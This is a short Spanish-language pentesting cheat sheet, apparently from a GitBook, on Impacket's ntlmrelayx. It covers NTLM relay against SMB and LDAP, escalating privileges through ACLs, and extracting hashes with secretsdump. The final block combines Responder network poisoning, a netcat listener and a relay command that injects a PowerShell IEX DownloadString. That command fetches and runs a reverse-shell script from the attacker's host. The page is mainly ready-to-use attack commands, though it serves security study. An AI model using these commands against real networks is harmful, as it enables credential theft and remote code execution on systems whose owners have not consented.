# ntlmrelayx

Realiza ataques de tipo Samba Relay originalmente descubierto por DC, extendido a varios protocolos (SMB, MSSQL, LDAP, etc). Recibe una lista de objetivos y por cada objetivo recibido elige el siguiente objetivo e intenta realizar un relay de las credenciales.

#### Ayuda

![](<../.gitbook/assets/image (4) (1).png>)

#### Uso

```bash
python3 ntlmrelayx.py -t ldap://IP --escalate-user [usuario] 
# El usuario especificado en la opción --escalate-user debe tener permisos de replicación
#en caso que un ataque de ACL se pueda realizar.
```

Este comando se completa conectándose vía SMB o HTTP, localmente, esto permite si la conexión es exitosa, se habilita el ACL, y la replicación con el fin de poder continuar con _**scretdumps**_ y extraer los hashes.

{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}

Obtener Hashes con Samba Relay. Esto permite que si no existe un recurso compartido el responder contesta como si existiera obteniendo así por medio de ntlmrelayx los hashed locales.

![](<../.gitbook/assets/image (8).png>)

Cuando Samba no se encuentra firmado es posible inyectar comandos a partir de un envenenamiento de red:

```bash
1. Responder -I <interface> -rdw
nc -nlvp <port>
python3 -m http.server
ntlmrelayx -t|tf <ip|archivo de IP> -smb2support -c "powershell IEX(new-object Net.WebClient).DownloadString('http://<IP>:8000/rev.ps1')"
#Esperar.....
```
